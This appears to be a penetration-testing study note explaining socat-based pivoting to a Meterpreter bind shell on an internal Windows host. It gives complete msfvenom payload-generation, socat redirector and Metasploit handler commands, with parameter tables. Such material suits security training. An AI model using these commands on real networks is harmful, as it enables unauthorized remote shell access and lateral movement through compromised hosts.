### Socat Redirection with a Bind Shell

This technique allows an attack host to connect to a **bind shell** on an internal Windows target by using a compromised Ubuntu server as a redirector. Unlike reverse shells that connect back to the attack host, a bind shell starts a listener on the victim, and the **socat redirector** bridges the gap between the attack host's handler and that listener.

#### Operational Workflow

1. **Generate the Bind Shell Payload** Create a Windows executable that, when executed, will bind a Meterpreter listener to a specific port on the internal target machine.
    
    ```
    msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o <FILENAME>.exe LPORT=<TARGET_PORT>
    ```
    
2. **Establish the Socat Redirector** On the compromised **pivot host**, start a socat listener. This command listens on a specified port and forwards all incoming traffic to the internal **target machine's** bind port.
    
    ```
    socat TCP4-LISTEN:<PIVOT_PORT>,fork TCP4:<TARGET_IP>:<TARGET_PORT>
    ```
    
3. **Configure the Metasploit Handler** Start a bind handler on the **attack host**. Configure it to point to the **pivot host's** IP and redirector port rather than the final target directly.
    
    ```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/bind_tcp
    set RHOST <PIVOT_IP>
    set LPORT <PIVOT_PORT>
    run
    ```
    
4. **Execute and Verify** Once the payload is executed on the Windows target, the handler connects to the socat listener on the pivot, which forwards the stage request to the Windows target, establishing a session.
    

---

#### Command Reference

**Payload Generation (`msfvenom`)**

|Parameter|Description|
|:--|:--|
|`-p windows/x64/meterpreter/bind_tcp`|Specifies a 64-bit Windows Meterpreter bind TCP payload.|
|`-f exe`|Sets the output format to an executable file.|
|`LPORT=<TARGET_PORT>`|The port the target machine will listen on.|

**Socat Redirector (`socat`)**

|Parameter|Description|
|:--|:--|
|`TCP4-LISTEN:<PIVOT_PORT>`|Listens for incoming IPv4 TCP connections on the pivot host.|
|`fork`|Allows socat to handle multiple simultaneous connections by spawning new processes.|
|`TCP4:<TARGET_IP>:<TARGET_PORT>`|Forwards the traffic to the internal target machine and its bind shell port.|

**Metasploit Handler Options**

|Option|Value/Description|
|:--|:--|
|`set payload`|`windows/x64/meterpreter/bind_tcp` (Must match the generated payload).|
|`set RHOST`|`<PIVOT_IP>` (The address of the redirector).|
|`set LPORT`|`<PIVOT_PORT>` (The port the redirector is listening on).|

---

#### Attack Implications

- **Pivoting Strategy:** This method is used when the internal target cannot communicate directly with the attack host but can be reached by the pivot host.
- **Session Access:** Successfully establishing the connection provides a Meterpreter session on the internal target (e.g., as a local user like `<DOMAIN>\<USERNAME>`).